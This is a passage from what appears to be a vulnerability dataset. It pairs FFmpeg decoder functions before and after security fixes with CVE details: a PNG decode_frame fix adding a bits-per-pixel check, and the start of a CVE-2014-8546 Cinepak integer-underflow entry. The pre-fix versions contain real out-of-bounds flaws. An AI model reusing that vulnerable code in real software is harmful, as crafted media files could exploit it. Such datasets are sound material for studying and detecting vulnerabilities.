&&\n                           s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGBA64BE;\n                } else if ((s->bits_per_pixel == 1 || s->bits_per_pixel == 2 || s->bits_per_pixel == 4 || s->bits_per_pixel == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_PALETTE) {\n                    avctx->pix_fmt = AV_PIX_FMT_PAL8;\n                } else if (s->bit_depth == 1) {\n                    avctx->pix_fmt = AV_PIX_FMT_MONOBLACK;\n                } else if (s->bit_depth == 8 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_YA8;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_YA16BE;\n                } else {\n                    av_log(avctx, AV_LOG_ERROR, \"unsupported bit depth %d \"\n                                                \"and color type %d\\n\",\n                                                 s->bit_depth, s->color_type);\n                    goto fail;\n                }\n\n                if (ff_thread_get_buffer(avctx, &s->picture, AV_GET_BUFFER_FLAG_REF) < 0)\n                    goto fail;\n                ff_thread_finish_setup(avctx);\n\n                p->pict_type        = AV_PICTURE_TYPE_I;\n                p->key_frame        = 1;\n                p->interlaced_frame = !!s->interlace_type;\n\n                /* compute the compressed row size */\n                if (!s->interlace_type) {\n                    s->crow_size = s->row_size + 1;\n                } else {\n                    s->pass          = 0;\n                    s->pass_row_size = ff_png_pass_row_size(s->pass,\n                                                            s->bits_per_pixel,\n                                                            s->width);\n                    s->crow_size = s->pass_row_size + 1;\n                }\n                av_dlog(avctx, \"row_size=%d crow_size =%d\\n\",\n                        s->row_size, s->crow_size);\n                s->image_buf      = p->data[0];\n                s->image_linesize = p->linesize[0];\n                /* copy the palette if needed */\n                if (avctx->pix_fmt == AV_PIX_FMT_PAL8)\n                    memcpy(p->data[1], s->palette, 256 * sizeof(uint32_t));\n                /* empty row is used if differencing to the first row */\n                av_fast_padded_mallocz(&s->last_row, &s->last_row_size, s->row_size);\n                if (!s->last_row)\n                    goto fail;\n                if (s->interlace_type ||\n                    s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    av_fast_padded_malloc(&s->tmp_row, &s->tmp_row_size, s->row_size);\n                    if (!s->tmp_row)\n                        goto fail;\n                }\n                /* compressed row */\n                av_fast_padded_malloc(&s->buffer, &s->buffer_size, s->row_size + 16);\n                if (!s->buffer)\n                    goto fail;\n\n                /* we want crow_buf+1 to be 16-byte aligned */\n                s->crow_buf          = s->buffer + 15;\n                s->zstream.avail_out = s->crow_size;\n                s->zstream.next_out  = s->crow_buf;\n            }\n            s->state |= PNG_IDAT;\n            if (png_decode_idat(s, length) < 0)\n                goto fail;\n            bytestream2_skip(&s->gb, 4); /* crc */\n            break;\n        case MKTAG('P', 'L', 'T', 'E'):\n        {\n            int n, i, r, g, b;\n\n            if ((length % 3) != 0 || length > 256 * 3)\n                goto skip_tag;\n            /* read the palette */\n            n = length / 3;\n            for (i = 0; i < n; i++) {\n                r = bytestream2_get_byte(&s->gb);\n                g = bytestream2_get_byte(&s->gb);\n                b = bytestream2_get_byte(&s->gb);\n                s->palette[i] = (0xFFU << 24) | (r << 16) | (g << 8) | b;\n            }\n            for (; i < 256; i++)\n                s->palette[i] = (0xFFU << 24);\n            s->state |= PNG_PLTE;\n            bytestream2_skip(&s->gb, 4);     /* crc */\n        }\n        break;\n        case MKTAG('t', 'R', 'N', 'S'):\n        {\n            int v, i;\n\n            /* read the transparency. XXX: Only palette mode supported */\n            if (s->color_type != PNG_COLOR_TYPE_PALETTE ||\n                length > 256 ||\n                !(s->state & PNG_PLTE))\n                goto skip_tag;\n            for (i = 0; i < length; i++) {\n                v = bytestream2_get_byte(&s->gb);\n                s->palette[i] = (s->palette[i] & 0x00ffffff) | (v << 24);\n            }\n            bytestream2_skip(&s->gb, 4);     /* crc */\n        }\n        break;\n        case MKTAG('t', 'E', 'X', 't'):\n            if (decode_text_chunk(s, length, 0, &metadata) < 0)\n                av_log(avctx, AV_LOG_WARNING, \"Broken tEXt chunk\\n\");\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        case MKTAG('z', 'T', 'X', 't'):\n            if (decode_text_chunk(s, length, 1, &metadata) < 0)\n                av_log(avctx, AV_LOG_WARNING, \"Broken zTXt chunk\\n\");\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        case MKTAG('I', 'E', 'N', 'D'):\n            if (!(s->state & PNG_ALLIMAGE))\n                av_log(avctx, AV_LOG_ERROR, \"IEND without all image\\n\");\n            if (!(s->state & (PNG_ALLIMAGE|PNG_IDAT))) {\n                goto fail;\n            }\n            bytestream2_skip(&s->gb, 4); /* crc */\n            goto exit_loop;\n        default:\n            /* skip tag */\nskip_tag:\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        }\n    }\nexit_loop:\n\n    if (s->bits_per_pixel == 1 && s->color_type == PNG_COLOR_TYPE_PALETTE){\n        int i, j, k;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width / 8;\n            for (k = 7; k >= 1; k--)\n                if ((s->width&7) >= k)\n                    pd[8*i + k - 1] = (pd[i]>>8-k) & 1;\n            for (i--; i >= 0; i--) {\n                pd[8*i + 7]=  pd[i]     & 1;\n                pd[8*i + 6]= (pd[i]>>1) & 1;\n                pd[8*i + 5]= (pd[i]>>2) & 1;\n                pd[8*i + 4]= (pd[i]>>3) & 1;\n                pd[8*i + 3]= (pd[i]>>4) & 1;\n                pd[8*i + 2]= (pd[i]>>5) & 1;\n                pd[8*i + 1]= (pd[i]>>6) & 1;\n                pd[8*i + 0]=  pd[i]>>7;\n            }\n            pd += s->image_linesize;\n        }\n    }\n    if (s->bits_per_pixel == 2){\n        int i, j;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width / 4;\n            if (s->color_type == PNG_COLOR_TYPE_PALETTE){\n                if ((s->width&3) >= 3) pd[4*i + 2]= (pd[i] >> 2) & 3;\n                if ((s->width&3) >= 2) pd[4*i + 1]= (pd[i] >> 4) & 3;\n                if ((s->width&3) >= 1) pd[4*i + 0]=  pd[i] >> 6;\n                for (i--; i >= 0; i--) {\n                    pd[4*i + 3]=  pd[i]     & 3;\n                    pd[4*i + 2]= (pd[i]>>2) & 3;\n                    pd[4*i + 1]= (pd[i]>>4) & 3;\n                    pd[4*i + 0]=  pd[i]>>6;\n                }\n            } else {\n                if ((s->width&3) >= 3) pd[4*i + 2]= ((pd[i]>>2) & 3)*0x55;\n                if ((s->width&3) >= 2) pd[4*i + 1]= ((pd[i]>>4) & 3)*0x55;\n                if ((s->width&3) >= 1) pd[4*i + 0]= ( pd[i]>>6     )*0x55;\n                for (i--; i >= 0; i--) {\n                    pd[4*i + 3]= ( pd[i]     & 3)*0x55;\n                    pd[4*i + 2]= ((pd[i]>>2) & 3)*0x55;\n                    pd[4*i + 1]= ((pd[i]>>4) & 3)*0x55;\n                    pd[4*i + 0]= ( pd[i]>>6     )*0x55;\n                }\n            }\n            pd += s->image_linesize;\n        }\n    }\n    if (s->bits_per_pixel == 4){\n        int i, j;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width/2;\n            if (s->color_type == PNG_COLOR_TYPE_PALETTE){\n                if (s->width&1) pd[2*i+0]= pd[i]>>4;\n                for (i--; i >= 0; i--) {\n                pd[2*i + 1] = pd[i] & 15;\n                pd[2*i + 0] = pd[i] >> 4;\n            }\n            } else {\n                if (s->width & 1) pd[2*i + 0]= (pd[i] >> 4) * 0x11;\n                for (i--; i >= 0; i--) {\n                    pd[2*i + 1] = (pd[i] & 15) * 0x11;\n                    pd[2*i + 0] = (pd[i] >> 4) * 0x11;\n                }\n            }\n            pd += s->image_linesize;\n        }\n    }\n\n    /* handle p-frames only if a predecessor frame is available */\n    if (s->last_picture.f->data[0]) {\n        if (   !(avpkt->flags & AV_PKT_FLAG_KEY) && avctx->codec_tag != AV_RL32(\"MPNG\")\n            && s->last_picture.f->width == p->width\n            && s->last_picture.f->height== p->height\n            && s->last_picture.f->format== p->format\n         ) {\n            int i, j;\n            uint8_t *pd      = p->data[0];\n            uint8_t *pd_last = s->last_picture.f->data[0];\n\n            ff_thread_await_progress(&s->last_picture, INT_MAX, 0);\n            for (j = 0; j < s->height; j++) {\n                for (i = 0; i < s->width * s->bpp; i++)\n                    pd[i] += pd_last[i];\n                pd      += s->image_linesize;\n                pd_last += s->image_linesize;\n            }\n        }\n    }\n    ff_thread_report_progress(&s->picture, INT_MAX, 0);\n\n    av_frame_set_metadata(p, metadata);\n    metadata   = NULL;\n\n    if ((ret = av_frame_ref(data, s->picture.f)) < 0)\n        return ret;\n\n    *got_frame = 1;\n\n    ret = bytestream2_tell(&s->gb);\nthe_end:\n    inflateEnd(&s->zstream);\n    s->crow_buf = NULL;\n    return ret;\nfail:\n    av_dict_free(&metadata);\n    ff_thread_report_progress(&s->picture, INT_MAX, 0);\n    ret = AVERROR_INVALIDDATA;\n    goto the_end;\n}",
        "func": "static int decode_frame(AVCodecContext *avctx,\n                        void *data, int *got_frame,\n                        AVPacket *avpkt)\n{\n    PNGDecContext *const s = avctx->priv_data;\n    const uint8_t *buf     = avpkt->data;\n    int buf_size           = avpkt->size;\n    AVFrame *p;\n    AVDictionary *metadata  = NULL;\n    uint32_t tag, length;\n    int64_t sig;\n    int ret;\n\n    ff_thread_release_buffer(avctx, &s->last_picture);\n    FFSWAP(ThreadFrame, s->picture, s->last_picture);\n    p = s->picture.f;\n\n    bytestream2_init(&s->gb, buf, buf_size);\n\n    /* check signature */\n    sig = bytestream2_get_be64(&s->gb);\n    if (sig != PNGSIG &&\n        sig != MNGSIG) {\n        av_log(avctx, AV_LOG_ERROR, \"Missing png signature\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    s->y = s->state = 0;\n\n    /* init the zlib */\n    s->zstream.zalloc = ff_png_zalloc;\n    s->zstream.zfree  = ff_png_zfree;\n    s->zstream.opaque = NULL;\n    ret = inflateInit(&s->zstream);\n    if (ret != Z_OK) {\n        av_log(avctx, AV_LOG_ERROR, \"inflateInit returned error %d\\n\", ret);\n        return AVERROR_EXTERNAL;\n    }\n    for (;;) {\n        if (bytestream2_get_bytes_left(&s->gb) <= 0) {\n            av_log(avctx, AV_LOG_ERROR, \"%d bytes left\\n\", bytestream2_get_bytes_left(&s->gb));\n            if (   s->state & PNG_ALLIMAGE\n                && avctx->strict_std_compliance <= FF_COMPLIANCE_NORMAL)\n                goto exit_loop;\n            goto fail;\n        }\n\n        length = bytestream2_get_be32(&s->gb);\n        if (length > 0x7fffffff || length > bytestream2_get_bytes_left(&s->gb))  {\n            av_log(avctx, AV_LOG_ERROR, \"chunk too big\\n\");\n            goto fail;\n        }\n        tag = bytestream2_get_le32(&s->gb);\n        if (avctx->debug & FF_DEBUG_STARTCODE)\n            av_log(avctx, AV_LOG_DEBUG, \"png: tag=%c%c%c%c length=%u\\n\",\n                (tag & 0xff),\n                ((tag >> 8) & 0xff),\n                ((tag >> 16) & 0xff),\n                ((tag >> 24) & 0xff), length);\n        switch (tag) {\n        case MKTAG('I', 'H', 'D', 'R'):\n            if (length != 13)\n                goto fail;\n            s->width  = bytestream2_get_be32(&s->gb);\n            s->height = bytestream2_get_be32(&s->gb);\n            if (av_image_check_size(s->width, s->height, 0, avctx)) {\n                s->width = s->height = 0;\n                av_log(avctx, AV_LOG_ERROR, \"Invalid image size\\n\");\n                goto fail;\n            }\n            s->bit_depth        = bytestream2_get_byte(&s->gb);\n            s->color_type       = bytestream2_get_byte(&s->gb);\n            s->compression_type = bytestream2_get_byte(&s->gb);\n            s->filter_type      = bytestream2_get_byte(&s->gb);\n            s->interlace_type   = bytestream2_get_byte(&s->gb);\n            bytestream2_skip(&s->gb, 4); /* crc */\n            s->state |= PNG_IHDR;\n            if (avctx->debug & FF_DEBUG_PICT_INFO)\n                av_log(avctx, AV_LOG_DEBUG, \"width=%d height=%d depth=%d color_type=%d \"\n                           \"compression_type=%d filter_type=%d interlace_type=%d\\n\",\n                    s->width, s->height, s->bit_depth, s->color_type,\n                    s->compression_type, s->filter_type, s->interlace_type);\n            break;\n        case MKTAG('p', 'H', 'Y', 's'):\n            if (s->state & PNG_IDAT) {\n                av_log(avctx, AV_LOG_ERROR, \"pHYs after IDAT\\n\");\n                goto fail;\n            }\n            avctx->sample_aspect_ratio.num = bytestream2_get_be32(&s->gb);\n            avctx->sample_aspect_ratio.den = bytestream2_get_be32(&s->gb);\n            if (avctx->sample_aspect_ratio.num < 0 || avctx->sample_aspect_ratio.den < 0)\n                avctx->sample_aspect_ratio = (AVRational){ 0, 1 };\n            bytestream2_skip(&s->gb, 1); /* unit specifier */\n            bytestream2_skip(&s->gb, 4); /* crc */\n            break;\n        case MKTAG('I', 'D', 'A', 'T'):\n            if (!(s->state & PNG_IHDR)) {\n                av_log(avctx, AV_LOG_ERROR, \"IDAT without IHDR\\n\");\n                goto fail;\n            }\n            if (!(s->state & PNG_IDAT)) {\n                /* init image info */\n                avctx->width  = s->width;\n                avctx->height = s->height;\n\n                s->channels       = ff_png_get_nb_channels(s->color_type);\n                s->bits_per_pixel = s->bit_depth * s->channels;\n                s->bpp            = (s->bits_per_pixel + 7) >> 3;\n                s->row_size       = (avctx->width * s->bits_per_pixel + 7) >> 3;\n\n                if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                    s->color_type == PNG_COLOR_TYPE_RGB) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGB24;\n                } else if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGBA;\n                } else if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY) {\n                    avctx->pix_fmt = AV_PIX_FMT_GRAY8;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY) {\n                    avctx->pix_fmt = AV_PIX_FMT_GRAY16BE;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_RGB) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGB48BE;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGBA64BE;\n                } else if ((s->bits_per_pixel == 1 || s->bits_per_pixel == 2 || s->bits_per_pixel == 4 || s->bits_per_pixel == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_PALETTE) {\n                    avctx->pix_fmt = AV_PIX_FMT_PAL8;\n                } else if (s->bit_depth == 1 && s->bits_per_pixel == 1) {\n                    avctx->pix_fmt = AV_PIX_FMT_MONOBLACK;\n                } else if (s->bit_depth == 8 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_YA8;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_YA16BE;\n                } else {\n                    av_log(avctx, AV_LOG_ERROR, \"unsupported bit depth %d \"\n                                                \"and color type %d\\n\",\n                                                 s->bit_depth, s->color_type);\n                    goto fail;\n                }\n\n                if (ff_thread_get_buffer(avctx, &s->picture, AV_GET_BUFFER_FLAG_REF) < 0)\n                    goto fail;\n                ff_thread_finish_setup(avctx);\n\n                p->pict_type        = AV_PICTURE_TYPE_I;\n                p->key_frame        = 1;\n                p->interlaced_frame = !!s->interlace_type;\n\n                /* compute the compressed row size */\n                if (!s->interlace_type) {\n                    s->crow_size = s->row_size + 1;\n                } else {\n                    s->pass          = 0;\n                    s->pass_row_size = ff_png_pass_row_size(s->pass,\n                                                            s->bits_per_pixel,\n                                                            s->width);\n                    s->crow_size = s->pass_row_size + 1;\n                }\n                av_dlog(avctx, \"row_size=%d crow_size =%d\\n\",\n                        s->row_size, s->crow_size);\n                s->image_buf      = p->data[0];\n                s->image_linesize = p->linesize[0];\n                /* copy the palette if needed */\n                if (avctx->pix_fmt == AV_PIX_FMT_PAL8)\n                    memcpy(p->data[1], s->palette, 256 * sizeof(uint32_t));\n                /* empty row is used if differencing to the first row */\n                av_fast_padded_mallocz(&s->last_row, &s->last_row_size, s->row_size);\n                if (!s->last_row)\n                    goto fail;\n                if (s->interlace_type ||\n                    s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    av_fast_padded_malloc(&s->tmp_row, &s->tmp_row_size, s->row_size);\n                    if (!s->tmp_row)\n                        goto fail;\n                }\n                /* compressed row */\n                av_fast_padded_malloc(&s->buffer, &s->buffer_size, s->row_size + 16);\n                if (!s->buffer)\n                    goto fail;\n\n                /* we want crow_buf+1 to be 16-byte aligned */\n                s->crow_buf          = s->buffer + 15;\n                s->zstream.avail_out = s->crow_size;\n                s->zstream.next_out  = s->crow_buf;\n            }\n            s->state |= PNG_IDAT;\n            if (png_decode_idat(s, length) < 0)\n                goto fail;\n            bytestream2_skip(&s->gb, 4); /* crc */\n            break;\n        case MKTAG('P', 'L', 'T', 'E'):\n        {\n            int n, i, r, g, b;\n\n            if ((length % 3) != 0 || length > 256 * 3)\n                goto skip_tag;\n            /* read the palette */\n            n = length / 3;\n            for (i = 0; i < n; i++) {\n                r = bytestream2_get_byte(&s->gb);\n                g = bytestream2_get_byte(&s->gb);\n                b = bytestream2_get_byte(&s->gb);\n                s->palette[i] = (0xFFU << 24) | (r << 16) | (g << 8) | b;\n            }\n            for (; i < 256; i++)\n                s->palette[i] = (0xFFU << 24);\n            s->state |= PNG_PLTE;\n            bytestream2_skip(&s->gb, 4);     /* crc */\n        }\n        break;\n        case MKTAG('t', 'R', 'N', 'S'):\n        {\n            int v, i;\n\n            /* read the transparency. XXX: Only palette mode supported */\n            if (s->color_type != PNG_COLOR_TYPE_PALETTE ||\n                length > 256 ||\n                !(s->state & PNG_PLTE))\n                goto skip_tag;\n            for (i = 0; i < length; i++) {\n                v = bytestream2_get_byte(&s->gb);\n                s->palette[i] = (s->palette[i] & 0x00ffffff) | (v << 24);\n            }\n            bytestream2_skip(&s->gb, 4);     /* crc */\n        }\n        break;\n        case MKTAG('t', 'E', 'X', 't'):\n            if (decode_text_chunk(s, length, 0, &metadata) < 0)\n                av_log(avctx, AV_LOG_WARNING, \"Broken tEXt chunk\\n\");\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        case MKTAG('z', 'T', 'X', 't'):\n            if (decode_text_chunk(s, length, 1, &metadata) < 0)\n                av_log(avctx, AV_LOG_WARNING, \"Broken zTXt chunk\\n\");\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        case MKTAG('I', 'E', 'N', 'D'):\n            if (!(s->state & PNG_ALLIMAGE))\n                av_log(avctx, AV_LOG_ERROR, \"IEND without all image\\n\");\n            if (!(s->state & (PNG_ALLIMAGE|PNG_IDAT))) {\n                goto fail;\n            }\n            bytestream2_skip(&s->gb, 4); /* crc */\n            goto exit_loop;\n        default:\n            /* skip tag */\nskip_tag:\n            bytestream2_skip(&s->gb, length + 4);\n            break;\n        }\n    }\nexit_loop:\n\n    if (s->bits_per_pixel == 1 && s->color_type == PNG_COLOR_TYPE_PALETTE){\n        int i, j, k;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width / 8;\n            for (k = 7; k >= 1; k--)\n                if ((s->width&7) >= k)\n                    pd[8*i + k - 1] = (pd[i]>>8-k) & 1;\n            for (i--; i >= 0; i--) {\n                pd[8*i + 7]=  pd[i]     & 1;\n                pd[8*i + 6]= (pd[i]>>1) & 1;\n                pd[8*i + 5]= (pd[i]>>2) & 1;\n                pd[8*i + 4]= (pd[i]>>3) & 1;\n                pd[8*i + 3]= (pd[i]>>4) & 1;\n                pd[8*i + 2]= (pd[i]>>5) & 1;\n                pd[8*i + 1]= (pd[i]>>6) & 1;\n                pd[8*i + 0]=  pd[i]>>7;\n            }\n            pd += s->image_linesize;\n        }\n    }\n    if (s->bits_per_pixel == 2){\n        int i, j;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width / 4;\n            if (s->color_type == PNG_COLOR_TYPE_PALETTE){\n                if ((s->width&3) >= 3) pd[4*i + 2]= (pd[i] >> 2) & 3;\n                if ((s->width&3) >= 2) pd[4*i + 1]= (pd[i] >> 4) & 3;\n                if ((s->width&3) >= 1) pd[4*i + 0]=  pd[i] >> 6;\n                for (i--; i >= 0; i--) {\n                    pd[4*i + 3]=  pd[i]     & 3;\n                    pd[4*i + 2]= (pd[i]>>2) & 3;\n                    pd[4*i + 1]= (pd[i]>>4) & 3;\n                    pd[4*i + 0]=  pd[i]>>6;\n                }\n            } else {\n                if ((s->width&3) >= 3) pd[4*i + 2]= ((pd[i]>>2) & 3)*0x55;\n                if ((s->width&3) >= 2) pd[4*i + 1]= ((pd[i]>>4) & 3)*0x55;\n                if ((s->width&3) >= 1) pd[4*i + 0]= ( pd[i]>>6     )*0x55;\n                for (i--; i >= 0; i--) {\n                    pd[4*i + 3]= ( pd[i]     & 3)*0x55;\n                    pd[4*i + 2]= ((pd[i]>>2) & 3)*0x55;\n                    pd[4*i + 1]= ((pd[i]>>4) & 3)*0x55;\n                    pd[4*i + 0]= ( pd[i]>>6     )*0x55;\n                }\n            }\n            pd += s->image_linesize;\n        }\n    }\n    if (s->bits_per_pixel == 4){\n        int i, j;\n        uint8_t *pd = p->data[0];\n        for (j = 0; j < s->height; j++) {\n            i = s->width/2;\n            if (s->color_type == PNG_COLOR_TYPE_PALETTE){\n                if (s->width&1) pd[2*i+0]= pd[i]>>4;\n                for (i--; i >= 0; i--) {\n                pd[2*i + 1] = pd[i] & 15;\n                pd[2*i + 0] = pd[i] >> 4;\n            }\n            } else {\n                if (s->width & 1) pd[2*i + 0]= (pd[i] >> 4) * 0x11;\n                for (i--; i >= 0; i--) {\n                    pd[2*i + 1] = (pd[i] & 15) * 0x11;\n                    pd[2*i + 0] = (pd[i] >> 4) * 0x11;\n                }\n            }\n            pd += s->image_linesize;\n        }\n    }\n\n    /* handle p-frames only if a predecessor frame is available */\n    if (s->last_picture.f->data[0]) {\n        if (   !(avpkt->flags & AV_PKT_FLAG_KEY) && avctx->codec_tag != AV_RL32(\"MPNG\")\n            && s->last_picture.f->width == p->width\n            && s->last_picture.f->height== p->height\n            && s->last_picture.f->format== p->format\n         ) {\n            int i, j;\n            uint8_t *pd      = p->data[0];\n            uint8_t *pd_last = s->last_picture.f->data[0];\n\n            ff_thread_await_progress(&s->last_picture, INT_MAX, 0);\n            for (j = 0; j < s->height; j++) {\n                for (i = 0; i < s->width * s->bpp; i++)\n                    pd[i] += pd_last[i];\n                pd      += s->image_linesize;\n                pd_last += s->image_linesize;\n            }\n        }\n    }\n    ff_thread_report_progress(&s->picture, INT_MAX, 0);\n\n    av_frame_set_metadata(p, metadata);\n    metadata   = NULL;\n\n    if ((ret = av_frame_ref(data, s->picture.f)) < 0)\n        return ret;\n\n    *got_frame = 1;\n\n    ret = bytestream2_tell(&s->gb);\nthe_end:\n    inflateEnd(&s->zstream);\n    s->crow_buf = NULL;\n    return ret;\nfail:\n    av_dict_free(&metadata);\n    ff_thread_report_progress(&s->picture, INT_MAX, 0);\n    ret = AVERROR_INVALIDDATA;\n    goto the_end;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -129,7 +129,7 @@\n                 } else if ((s->bits_per_pixel == 1 || s->bits_per_pixel == 2 || s->bits_per_pixel == 4 || s->bits_per_pixel == 8) &&\n                            s->color_type == PNG_COLOR_TYPE_PALETTE) {\n                     avctx->pix_fmt = AV_PIX_FMT_PAL8;\n-                } else if (s->bit_depth == 1) {\n+                } else if (s->bit_depth == 1 && s->bits_per_pixel == 1) {\n                     avctx->pix_fmt = AV_PIX_FMT_MONOBLACK;\n                 } else if (s->bit_depth == 8 &&\n                            s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {",
        "diff_line_info": {
            "deleted_lines": [
                "                } else if (s->bit_depth == 1) {"
            ],
            "added_lines": [
                "                } else if (s->bit_depth == 1 && s->bits_per_pixel == 1) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-8546",
        "func_name": "ffmpeg/cinepak_decode_vectors",
        "description": "Integer underflow in libavcodec/cinepak.c in FFmpeg before 2.4.2 allows remote attackers to cause a denial of service (out-of-bounds access) or possibly have unspecified other impact via crafted Cinepak video data.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=e7e5114c506957f40aafd794e06de1a7e341e9d5",
        "commit_title": "",
        "commit_text": "avcodec/cinepak: fix integer underflow  Fixes out of array access  ",
        "func_before": "static int cinepak_decode_vectors (CinepakContext *s, cvid_strip *strip,\n                                   int chunk_id, int size, const uint8_t *data)\n{\n    const uint8_t   *eod = (data + size);\n    uint32_t         flag, mask;\n    uint8_t         *cb0, *cb1, *cb2, *cb3;\n    unsigned int     x, y;\n    char            *ip0, *ip1, *ip2, *ip3;\n\n    flag = 0;\n    mask = 0;\n\n    for (y=strip->y1; y < strip->y2; y+=4) {\n\n/* take care of y dimension not being multiple of 4, such streams exist */\n        ip0 = ip1 = ip2 = ip3 = s->frame->data[0] +\n          (s->palette_video?strip->x1:strip->x1*3) + (y * s->frame->linesize[0]);\n        if(s->avctx->height - y > 1) {\n            ip1 = ip0 + s->frame->linesize[0];\n            if(s->avctx->height - y > 2) {\n                ip2 = ip1 + s->frame->linesize[0];\n                if(s->avctx->height - y > 3) {\n                    ip3 = ip2 + s->frame->linesize[0];\n                }\n            }\n        }\n/* to get the correct picture for not-multiple-of-4 cases let us fill\n * each block from the bottom up, thus possibly overwriting the top line\n * more than once but ending with the correct data in place\n * (instead of in-loop checking) */\n\n        for (x=strip->x1; x < strip->x2; x+=4) {\n            if ((chunk_id & 0x01) && !(mask >>= 1)) {\n                if ((data + 4) > eod)\n                    return AVERROR_INVALIDDATA;\n\n                flag  = AV_RB32 (data);\n                data += 4;\n                mask  = 0x80000000;\n            }\n\n            if (!(chunk_id & 0x01) || (flag & mask)) {\n                if (!(chunk_id & 0x02) && !(mask >>= 1)) {\n                    if ((data + 4) > eod)\n                        return AVERROR_INVALIDDATA;\n\n                    flag  = AV_RB32 (data);\n                    data += 4;\n                    mask  = 0x80000000;\n                }\n\n                if ((chunk_id & 0x02) || (~flag & mask)) {\n                    uint8_t *p;\n                    if (data >= eod)\n                        return AVERROR_INVALIDDATA;\n\n                    p = strip->v1_codebook[*data++];\n                    if (s->palette_video) {\n                        ip3[0] = ip3[1] = ip2[0] = ip2[1] = p[6];\n                        ip3[2] = ip3[3] = ip2[2] = ip2[3] = p[9];\n                        ip1[0] = ip1[1] = ip0[0] = ip0[1] = p[0];\n                        ip1[2] = ip1[3] = ip0[2] = ip0[3] = p[3];\n                    } else {\n                        p += 6;\n                        memcpy(ip3 + 0, p, 3); memcpy(ip3 + 3, p, 3);\n                        memcpy(ip2 + 0, p, 3); memcpy(ip2 + 3, p, 3);\n                        p += 3; /* ... + 9 */\n                        memcpy(ip3 + 6, p, 3); memcpy(ip3 + 9, p, 3);\n                        memcpy(ip2 + 6, p, 3); memcpy(ip2 + 9, p, 3);\n                        p -= 9; /* ... + 0 */\n                        memcpy(ip1 + 0, p, 3); memcpy(ip1 + 3, p, 3);\n                        memcpy(ip0 + 0, p, 3); memcpy(ip0 + 3, p, 3);\n                        p += 3; /* ... + 3 */\n                        memcpy(ip1 + 6, p, 3); memcpy(ip1 + 9, p, 3);\n                        memcpy(ip0 + 6, p, 3); memcpy(ip0 + 9, p, 3);\n                    }\n\n                } else if (flag & mask) {\n                    if ((data + 4) > eod)\n                        return AVERROR_INVALIDDATA;\n\n                    cb0 = strip->v4_codebook[*data++];\n                    cb1 = strip->v4_codebook[*data++];\n                    cb2 = strip->v4_codebook[*data++];\n                    cb3 = strip->v4_codebook[*data++];\n                    if (s->palette_video) {\n                        uint8_t *p;\n                        p = ip3;\n                        *p++ = cb2[6];\n                        *p++ = cb2[9];\n                        *p++ = cb3[6];\n                        *p   = cb3[9];\n                        p = ip2;\n                        *p++ = cb2[0];\n                        *p++ = cb2[3];\n                        *p++ = cb3[0];\n                        *p   = cb3[3];\n                        p = ip1;\n                        *p++ = cb0[6];\n                        *p++ = cb0[9];\n                        *p++ = cb1[6];\n                        *p   = cb1[9];\n                        p = ip0;\n                        *p++ = cb0[0];\n                        *p++ = cb0[3];\n                        *p++ = cb1[0];\n                        *p   = cb1[3];\n                    } else {\n                        memcpy(ip3 + 0, cb2 + 6, 6);\n                        memcpy(ip3 + 6, cb3 + 6, 6);\n                        memcpy(ip2 + 0, cb2 + 0, 6);\n                        memcpy(ip2 + 6, cb3 + 0, 6);\n                        memcpy(ip1 + 0, cb0 + 6, 6);\n                        memcpy(ip1 + 6, cb1 + 6, 6);\n                        memcpy(ip0 + 0, cb0 + 0, 6);\n                        memcpy(ip0 + 6, cb1 + 0, 6);\n                    }\n\n                }\n            }\n\n            if (s->palette_video) {\n                ip0 += 4;  ip1 += 4;\n                ip2 += 4;  ip3 += 4;\n            } else {\n                ip0 += 12;  ip1 += 12;\n                ip2 += 12;  ip3 += 12;\n            }\n        }\n    }\n\n    return 0;\n}",
